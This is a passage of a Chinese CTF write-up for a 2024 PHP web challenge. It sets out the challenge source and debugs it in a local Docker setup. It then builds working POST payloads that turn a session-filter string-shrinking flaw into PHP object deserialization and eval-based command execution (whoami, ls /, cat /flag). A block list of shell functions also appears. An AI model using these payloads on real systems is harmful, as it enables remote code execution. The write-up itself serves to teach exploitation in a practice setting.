+</span></span><span class="line"><span class="cl">        input[type=&#34;text&#34;],
+</span></span><span class="line"><span class="cl">        input[type=&#34;password&#34;] {
+</span></span><span class="line"><span class="cl">            width: 100%;
+</span></span><span class="line"><span class="cl">            padding: 10px;
+</span></span><span class="line"><span class="cl">            margin-bottom: 15px;
+</span></span><span class="line"><span class="cl">            border: 1px solid #ddd;
+</span></span><span class="line"><span class="cl">            border-radius: 5px;
+</span></span><span class="line"><span class="cl">            box-sizing: border-box;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        input[type=&#34;submit&#34;] {
+</span></span><span class="line"><span class="cl">            background-color: #007BFF;
+</span></span><span class="line"><span class="cl">            color: white;
+</span></span><span class="line"><span class="cl">            border: none;
+</span></span><span class="line"><span class="cl">            padding: 10px;
+</span></span><span class="line"><span class="cl">            border-radius: 5px;
+</span></span><span class="line"><span class="cl">            cursor: pointer;
+</span></span><span class="line"><span class="cl">            width: 100%;
+</span></span><span class="line"><span class="cl">            font-size: 16px;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        input[type=&#34;submit&#34;]:hover {
+</span></span><span class="line"><span class="cl">            background-color: #0056b3;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    &lt;/style&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">    &lt;div class=&#34;login-container&#34;&gt;
+</span></span><span class="line"><span class="cl">        &lt;h1&gt;用户登录&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">        &lt;form action=&#34;index.php&#34; method=&#34;post&#34;&gt;
+</span></span><span class="line"><span class="cl">            &lt;label for=&#34;username&#34;&gt;用户名:&lt;/label&gt;
+</span></span><span class="line"><span class="cl">            &lt;input type=&#34;text&#34; id=&#34;username&#34; name=&#34;username&#34; required&gt;
+</span></span><span class="line"><span class="cl">            &lt;label for=&#34;password&#34;&gt;密码:&lt;/label&gt;
+</span></span><span class="line"><span class="cl">            &lt;input type=&#34;password&#34; id=&#34;password&#34; name=&#34;password&#34; required&gt;
+</span></span><span class="line"><span class="cl">            &lt;input type=&#34;submit&#34; value=&#34;登录&#34;&gt;
+</span></span><span class="line"><span class="cl">        &lt;/form&gt;
+</span></span><span class="line"><span class="cl">    &lt;/div&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>dashborad.php</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;class.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: login.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html lang=&#34;en&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;title&gt;任何人都可以登录的平台&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;style&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">        body {
+</span></span></span><span class="line"><span class="cl"><span class="err">            background-color: #f0f4f8;
+</span></span></span><span class="line"><span class="cl"><span class="err">            font-family: Arial, sans-serif;
+</span></span></span><span class="line"><span class="cl"><span class="err">            display: flex;
+</span></span></span><span class="line"><span class="cl"><span class="err">            flex-direction: column;
+</span></span></span><span class="line"><span class="cl"><span class="err">            align-items: center;
+</span></span></span><span class="line"><span class="cl"><span class="err">            justify-content: center;
+</span></span></span><span class="line"><span class="cl"><span class="err">            height: 100vh;
+</span></span></span><span class="line"><span class="cl"><span class="err">            margin: 0;
+</span></span></span><span class="line"><span class="cl"><span class="err">            text-align: center;
+</span></span></span><span class="line"><span class="cl"><span class="err">        }
+</span></span></span><span class="line"><span class="cl"><span class="err">        h1 {
+</span></span></span><span class="line"><span class="cl"><span class="err">            color: #333;
+</span></span></span><span class="line"><span class="cl"><span class="err">            margin-bottom: 20px;
+</span></span></span><span class="line"><span class="cl"><span class="err">        }
+</span></span></span><span class="line"><span class="cl"><span class="err">        p {
+</span></span></span><span class="line"><span class="cl"><span class="err">            color: #555;
+</span></span></span><span class="line"><span class="cl"><span class="err">            font-size: 18px;
+</span></span></span><span class="line"><span class="cl"><span class="err">            margin: 0;
+</span></span></span><span class="line"><span class="cl"><span class="err">        }
+</span></span></span><span class="line"><span class="cl"><span class="err">        .session-info {
+</span></span></span><span class="line"><span class="cl"><span class="err">            background-color: #fff;
+</span></span></span><span class="line"><span class="cl"><span class="err">            border-radius: 10px;
+</span></span></span><span class="line"><span class="cl"><span class="err">            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+</span></span></span><span class="line"><span class="cl"><span class="err">            padding: 20px;
+</span></span></span><span class="line"><span class="cl"><span class="err">            width: 300px;
+</span></span></span><span class="line"><span class="cl"><span class="err">            margin-top: 20px;
+</span></span></span><span class="line"><span class="cl"><span class="err">        }
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;/style&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;h1&gt;欢迎来到任何人都可以登录的平台&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;div class=&#34;session-info&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;p&gt;你好，&lt;?php echo htmlspecialchars($_SESSION[&#39;user&#39;]); ?&gt;！&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
+</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>user.php</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$validUser</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;password&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">authenticate</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20241105200845953.png" alt="image-20241105200845953" loading="lazy"></figure>
+</p>
+<p>随意登录</p>
+<p><figure>
+  <img src="image-20241105200856834.png" alt="image-20241105200856834" loading="lazy"></figure>
+</p>
+<p>搭建 <code>docker</code> 进行本地调试</p>
+<p><strong>首先对解题思路进行分析</strong></p>
+<p>当访问 <code>index.php</code> 时，会将多个信息存入 <code>session</code> 中，根据 <code>php</code> 中<code>session</code> 的机制，这些信息会存储在本地文件内</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">//index.php
+</span></span><span class="line"><span class="cl">if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39;) {
+</span></span><span class="line"><span class="cl">    $username = $_POST[&#39;username&#39;];
+</span></span><span class="line"><span class="cl">    $password = $_POST[&#39;password&#39;];
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    $_SESSION[&#39;user&#39;] = $username;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    if (!isset($_SESSION[&#39;session_key&#39;])) {
+</span></span><span class="line"><span class="cl">        $_SESSION[&#39;session_key&#39;] =$SessionRandom -&gt; generateRandomString();
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    $_SESSION[&#39;password&#39;] = $password;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><code>$SessionRandom -&gt; generateRandomString()</code> 的作用，是调用 <code>class.php</code> 中 <code>SessionRandom</code> 的 <code>generateRandomString()</code> 函数，这个函数会按照给定的字符生成一个一些随机值并返回</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">SessionRandom</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">generateRandomString</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">length</span> <span class="o">=</span> <span class="n">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">50</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">characters</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">charactersLength</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="err">$</span><span class="n">characters</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">randomString</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="err">$</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="err">$</span><span class="n">i</span> <span class="o">&lt;</span> <span class="err">$</span><span class="n">length</span><span class="p">;</span> <span class="err">$</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">randomString</span> <span class="o">.=</span> <span class="err">$</span><span class="n">characters</span><span class="p">[</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="err">$</span><span class="n">charactersLength</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="err">$</span><span class="n">randomString</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>当直接访问 <code>index.php</code> ，不输入账号密码时</p>
+<p><figure>
+  <img src="image-20241105202017717.png" alt="image-20241105202017717" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20241105202050883.png" alt="image-20241105202050883" loading="lazy"></figure>
+</p>
+<p>当输入账号密码时，可以看到信息都被存入 <code>session</code> 文件中</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">admin/admin</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20241105202157274.png" alt="image-20241105202157274" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20241105202346170.png" alt="image-20241105202346170" loading="lazy"></figure>
+</p>
+<p>然后看 <code>class.php</code> ，这个文件内容是关于一些自定义函数和魔术方法，当访问 <code>index.php</code> ，就会触发 <code>class.php</code> 的 <code>SessionMaganer-&gt;filterSesnsitiveFunctions()</code></p>
+<p>关键点在这里，会对 <code>session</code> 文件内容进行替换，假如匹配到指定字符串则替换为空，存在<strong>字符串溢出减少漏洞</strong></p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">private $sensitiveFunctions = [&#39;system&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;passthru&#39;, &#39;shell_exec&#39;, &#39;popen&#39;, &#39;proc_open&#39;];
+</span></span><span class="line"><span class="cl">....
+</span></span><span class="line"><span class="cl">foreach ($this-&gt;sensitiveFunctions as $function) {
+</span></span><span class="line"><span class="cl">                if (strpos($sessionData, $function) !== false) {
+</span></span><span class="line"><span class="cl">                    $sessionData = str_replace($function, &#39;&#39;, $sessionData);
+</span></span><span class="line"><span class="cl">                }
+</span></span><span class="line"><span class="cl">            }</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>继续看 <code>class.php</code> ，<code>notouchitsclass</code> 对象中存在 <code>eval()</code> 函数，反序列化的时候会触发，结合前面的 <code>session</code> 内容写入，可以总结出生成序列化字符串写入 <code>session</code> 中，然后反序列化这一串思路</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">notouchitsclass</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="err">$</span><span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="err">$</span><span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">eval</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>接下来就是找到反序列化的点，哪里会将程序进行反序列化：</p>
+<p>在 <code>dashboard.php</code> 存在中 <code>session_start()</code> 函数，要读取 <code>session</code> 文件，就得在读取时进行反序列化</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>在本地继续测试，输入 <code>admin/system</code> ，按照源码，<code>system</code> 本应该会被替换为空，但是看到本地实际上 <code>session</code> 文件中 <code>password</code> 仍然为 <code>system</code></p>
+<p><figure>
+  <img src="image-20241105210402393.png" alt="image-20241105210402393" loading="lazy"></figure>
+</p>
+<p>修改程序进一步调试</p>
+<p><figure>
+  <img src="image-20241105212708611.png" alt="" loading="lazy"></figure>
+</p>
+<p>再次发包，看到 <code>sessionFile</code> 得到的值为 <code>/sess_abc</code> ，而本地内部默认存储的是 <code>/tmp/sess_xx</code> 路径，因此本地的程序并不像理论上的进行运行</p>
+<p><figure>
+  <img src="image-20241105212803227.png" alt="image-20241105212803227" loading="lazy"></figure>
+</p>
+<p>找到问题，给 <code>$sessionPath</code> 赋值上 <code>/tmp</code> 即可</p>
+<p><figure>
+  <img src="image-20241105213302484.png" alt="image-20241105213302484" loading="lazy"></figure>
+</p>
+<p>再次发包，本地的 <code>system</code> 被正确替换了</p>
+<p><figure>
+  <img src="image-20241105213756379.png" alt="image-20241105213756379" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20241105213835905.png" alt="image-20241105213835905" loading="lazy"></figure>
+</p>
+<p>这里字符串溢出就很明显，字符被替换为空，但前面的数字不变</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">s:6:&#34;&#34;;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>在正式进行字符串溢出漏洞利用之前，先做一步确认 <code>dashboard.php</code> 会触发反序列化</p>
+<p>准备要序列化的内容，当反序列化时，就会触发 <code>class.php</code> 的 <code>notouchitsclass.__destruct()</code> 的魔术方法</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">notouchitsclass</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;system(&#39;echo OK &gt; /tmp/OK&#39;);&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">notouchitsclass</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//O:15:&#34;notouchitsclass&#34;:1:{s:4:&#34;data&#34;;s:28:&#34;system(&#39;echo OK &gt; /tmp/OK&#39;);&#34;;}
+</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>直接本地将 session 内容修改</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">user|O:15:&#34;notouchitsclass&#34;:1:{s:4:&#34;data&#34;;s:28:&#34;system(&#39;echo OK &gt; /tmp/OK&#39;);&#34;;}......</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20241106100552865.png" alt="image-20241106100552865" loading="lazy"></figure>
+</p>
+<p>访问 <code>dashboard.php</code> ，提示权限不够</p>
+<p><figure>
+  <img src="image-20241106100719371.png" alt="image-20241106100719371" loading="lazy"></figure>
+</p>
+<p>本地 <code>docker</code> 的默认用户是 <code>root</code> ，修改之后，它默认权限也变为了 <code>root</code> ，将 <code>session</code> 文件权限降级</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">chown www-data:www-data /tmp/sess_abc</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20241106102907096.png" alt="image-20241106102907096" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20241106105740938.png" alt="image-20241106105740938" loading="lazy"></figure>
+</p>
+<p>访问 <code>/dashboard.php</code> ，本地生成了 <code>/tmp/OK</code> ，说明反序列化确实执行了<figure>
+  <img src="image-20241106105824027.png" alt="image-20241106105824027" loading="lazy"></figure>
+</p>
+<p>接下来就是 <strong>字符串溢出减少的利用</strong></p>
+<p>溢出减少的条件之一：两个相连可控参数，利用传参数组创造这个条件</p>
+<p><figure>
+  <img src="image-20241106110423045.png" alt="image-20241106110423045" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20241106110457517.png" alt="image-20241106110457517" loading="lazy"></figure>
+</p>
+<p>字符串溢出当有源码时可以本地调试时，构造技巧，可以直接让源码打印出替换后的值，然后改一次发一次，取出来再微调。</p>
+<p>构造初步 Payload</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">username=admin&amp;password[]=systemsystem&amp;password[]=&#34;;i:1;O:15:&#34;notouchitsclass&#34;:1:{s:4:&#34;data&#34;;s:17:&#34;system(&#39;whoami&#39;);&#34;;}}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>发现当传入之后，这里的 <code>system</code> 被替换为空了</p>
+<p><figure>
+  <img src="image-20241106112720360.png" alt="image-20241106112720360" loading="lazy"></figure>
+</p>
+<p>补上双写(双写的同时不能修改前面的数值，因为双写后有一个 <code>system</code> 会被替换为空)</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">username=admin&amp;password[]=systemsystem&amp;password[]=&#34;;i:1;O:15:&#34;notouchitsclass&#34;:1:{s:4:&#34;data&#34;;s:17:&#34;syssystemtem(&#39;whoami&#39;);&#34;;}}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>多次请求，将 <code>session</code> 写入，然后请求 <code>dashboard.php</code> ，本地测试成功</p>
+<p><figure>
+  <img src="image-20241106113631325.png" alt="image-20241106113631325" loading="lazy"></figure>
+</p>
+<p>接下来打远程 !</p>
+<p>发包时会返回 302 重定向，跳转到 <code>dashboard.php</code> ，不管它，多发几次，将内容写入 <code>session</code></p>
+<p><figure>
+  <img src="image-20241106114358764.png" alt="image-20241106114358764" loading="lazy"></figure>
+</p>
+<p>然后访问 <code>dashboard.php</code> ，成功执行 <code>whoami</code></p>
+<p><figure>
+  <img src="image-20241106114350366.png" alt="image-20241106114350366" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">username=admin&amp;password[]=systemsystem&amp;password[]=&#34;;i:1;O:15:&#34;notouchitsclass&#34;:1:{s:4:&#34;data&#34;;s:15:&#34;syssystemtem(&#39;ls /&#39;);&#34;;}}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20241106114752216.png" alt="image-20241106114752216" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">username=admin&amp;password[]=systemsystem&amp;password[]=&#34;;i:1;O:15:&#34;notouchitsclass&#34;:1:{s:4:&#34;data&#34;;s:20:&#34;syssystemtem(&#39;cat /flag&#39;);&#34;;}}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20241106114906494.png" alt="image-20241106114906494" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="2024-强网杯pyblockly"><span>[2024 强网杯]PyBlockly</span>
+  <a href="#2024-%e5%bc%ba%e7%bd%91%e6%9d%afpyblockly" class="heading-mark">
